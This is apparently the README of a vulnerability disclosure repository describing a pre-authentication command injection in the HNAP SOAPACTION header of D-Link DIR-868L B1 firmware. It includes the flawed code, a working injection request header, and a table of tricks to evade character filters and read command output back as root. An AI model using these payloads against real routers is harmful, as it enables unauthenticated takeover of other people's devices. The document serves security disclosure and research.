# D-Link DIR-868L (rev. B1) — Pre-auth Command Injection in HNAP `SOAPACTION` Handling

> Unauthenticated OS command execution as **root** through a single crafted
> HTTP header, with full command-output read-back over the same response.
> Affected: DIR-868L **B1**, firmware **v2.01b05** (`DIR868LB1_FW201b05.bin`, 2015-01 build).
> CVSS 3.1: **9.8** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` · CWE-78 · CVE pending

**[>> Full advisory](ADVISORY.md)** · **[>> Root-cause analysis](analysis/root-cause.md)** · **[>> PoC](poc/poc_hnap_injection.py)**

## TL;DR

The HNAP CGI handler (`/htdocs/cgibin`, hnap entry — `sub_1A57C`) decides
whether a request needs authentication with an **unanchored substring match**:

```c
if (!strstr(soapaction, "http://purenetworks.com/HNAP1/GetDeviceSettings")) {
    /* HNAP_AUTH HMAC verification, cookie checks, ... ALL authentication lives here */
}
```

`GetDeviceSettings` is meant to be pre-auth (setup wizard), but because the
check is `strstr()`, any request whose `SOAPACTION` *contains* that prefix
skips the whole authentication block. The handler then extracts the "action
name" as the text **after the last `/`** of the same header and passes it,
unfiltered, to:

```c
sprintf(s, "sh /var/run/%s.sh > /dev/console", action);   /* 0x1AA34 */
system(s);                                                /* 0x1AA40 */
```

```http
GET /HNAP1/ HTTP/1.1
SOAPACTION: "http://purenetworks.com/HNAP1/GetDeviceSettings/; sleep 10;"
```

- Server sleeps exactly **10.02 s** (blind timing oracle; an unknown
  non-spoofed action returns **401**, proving the auth gate is otherwise active).
- With a CGI header prefix (`echo Content-Type: text/plain; echo;`) the
  injected command **inherits the CGI's stdout**, so its output is returned
  in the HTTP response: `cat /proc/self/status` → `Uid: 0 0 0 0`.
- The web server runs CGIs as **root**.

Verified on the exact firmware binary through static analysis, Unicorn
emulation, `qemu-arm` user-mode execution (strace `execve` chain, `uid=0`)
and **FirmAE full-system emulation over HTTP** (dose-dependent timing,
output retrieval). See [analysis/verification.md](analysis/verification.md).

## Not a duplicate of CVE-2015-2051

[CVE-2015-2051](https://nvd.nist.gov/vuln/detail/CVE-2015-2051) is the same
defect class on the DIR-645/DIR-815/DIR-810L generation (exploited in the
wild by TheMoon). **DIR-868L is not listed in any advisory of that CVE
family**, and this repository documents the flaw — with exact code paths,
bypass mechanics, exploitation constraints and a four-level verification
chain — on DIR-868L B1 firmware 2.01b05.

## Exploitation constraints (measured)

| Constraint | Reason | Workaround |
|---|---|---|
| payload must follow the last `/` of the header | action = `strrchr(SOAPACTION,'/')+1` | build `/` at runtime: ``s=`echo $PATH \| busybox cut -c1` `` then `${s}proc${s}self...` |
| `(` not allowed in header value | web server header parser | no `$()`; backticks work |
| output only relayed with CGI headers | httpd CGI protocol | `echo Content-Type: text/plain; echo;` prefix |

## Repository layout

```
ADVISORY.md              formal advisory (severity, affected, fix, timeline)
analysis/
  root-cause.md          auth-bypass + sink analysis, addresses, constraints
  verification.md        4-level verification methodology and evidence
poc/
  poc_hnap_injection.py  standalone PoC (timing oracle + output channel)
  hnap_http_poc.sh       FirmAE HTTP test suite (baseline/401-control/injection)
  hnap_qemu_root.sh      qemu-arm user-mode reproduction incl. strace capture
  verify_hnap_pigw.py    Unicorn emulation of the real binary (auth-never-called proof)
  firmware_hashes.txt    precise component fingerprints
```

## Responsible disclosure

VulDB submission filed 2026-09-28 (CVE requested). Vendor notification to
D-Link PSIRT planned alongside. See [ADVISORY.md](ADVISORY.md).

## Credit

Discovered and researched by **`Walnut1337`**, 2026-09.
